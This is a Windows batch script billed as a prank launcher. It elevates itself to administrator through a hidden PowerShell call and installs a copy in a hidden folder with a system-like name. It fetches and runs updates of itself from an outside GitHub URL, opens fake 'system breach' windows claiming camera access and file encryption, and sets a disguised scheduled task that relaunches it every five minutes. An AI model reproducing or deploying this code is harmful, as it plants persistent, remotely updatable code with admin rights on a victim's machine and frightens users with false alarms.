@echo off
setlocal enabledelayedexpansion

:: ============================================================
::   AUTO‑UPDATING PRANK LAUNCHER (DEBUG VERSION)
:: ============================================================

:: ---------- CHECK FOR ADMIN ----------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Not admin – launching elevated...
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
echo Running as admin – continuing...
pause

:: ---------- CONFIGURATION ----------
set "BASE=%LOCALAPPDATA%\.sysupdatecom"
set "SELF=%BASE%\launcher.cmd"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "SELF_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/launcher.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "REMOTE_VER=%TEMP%\rv.txt"
set "MAX_RETRIES=3"
echo Configuration set.
pause

:: Create base folder
if not exist "%BASE%" mkdir "%BASE%"
if errorlevel 1 (
    echo ERROR: Cannot create %BASE%
    pause
    exit /b 1
)
attrib +h "%BASE%"
echo Base folder ready.
pause

:: Self‑install
if /i not "%~f0"=="%SELF%" (
    copy /Y "%~f0" "%SELF%"
    if errorlevel 1 (
        echo ERROR: Cannot copy self to %SELF%
        pause
        exit /b 1
    )
    attrib +h "%SELF%"
    echo Self installed.
    pause
)

:: ---------- DOWNLOAD FUNCTION ----------
:DOWNLOAD
set "URL=%~1"
set "OUT=%~2"
set "RETRY_COUNT=0"

:RETRY_LOOP
set /a RETRY_COUNT+=1
if !RETRY_COUNT! gtr %MAX_RETRIES% (
    echo ERROR: Failed to download %URL% after %MAX_RETRIES% attempts.
    exit /b 1
)

echo Attempt !RETRY_COUNT! to download %URL% ...
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!OUT!' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" 
if exist "!OUT!" (
    for %%A in ("!OUT!") do if %%~zA gtr 0 (
        echo Download successful.
        exit /b 0
    )
)
where curl >nul 2>&1
if !errorlevel! equ 0 (
    curl -s -L -o "!OUT!" "!URL!"
    if exist "!OUT!" (
        for %%A in ("!OUT!") do if %%~zA gtr 0 (
            echo Download successful via curl.
            exit /b 0
        )
    )
)
echo Download failed, retrying...
timeout /t 2 /nobreak >nul
goto RETRY_LOOP

:: ---------- CHECK FOR UPDATES ----------
call :DOWNLOAD "%VERSION_URL%" "%REMOTE_VER%"
if exist "%REMOTE_VER%" (
    set /p REMOTE=<"%REMOTE_VER%"
    if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"
    if not "!LOCAL!"=="!REMOTE!" (
        echo Updating from !LOCAL! to !REMOTE! ...
        call :DOWNLOAD "%SELF_URL%" "%TEMP%\update.cmd"
        if exist "%TEMP%\update.cmd" (
            move /Y "%SELF%" "%SELF%.old"
            move /Y "%TEMP%\update.cmd" "%SELF%"
            echo !REMOTE! > "%LOCAL_VER%"
            attrib +h "%SELF%"
            echo Update complete – launching new version.
            start "" "%SELF%"
            exit
        ) else (
            echo ERROR: Failed to download update.
            pause
        )
    ) else (
        echo Already up to date.
    )
) else (
    echo WARNING: Could not fetch version info.
)
pause

:: ---------- PRANK CODE ----------
title SYSTEM BREACH DETECTED
color 0a
for /l %%i in (1,1,5) do (
    start "SECURITY ALERT %%i" cmd /c "color 4 && title CRITICAL ERROR %%i && echo. && echo [!] Unauthorized Access Detected... && echo. && echo Hacking Laptop... %%i%% && echo. && echo Accessing Camera... && echo Accessing Files... && echo Encrypting Data... && echo. && echo DO NOT TURN OFF YOUR COMPUTER! && echo. && echo Press any key to attempt recovery... && pause > nul"
)
timeout /t 2 > nul
echo Prank launched.
pause

:: ---------- SCHEDULE TASK ----------
schtasks /create /tn "SyslogLauncher" /tr "cmd /c start /min \"\" \"%SELF%\"" /sc minute /mo 5 /f
if errorlevel 1 (
    echo ERROR: Failed to create scheduled task.
    pause
) else (
    echo Scheduled task created.
    pause
)

endlocal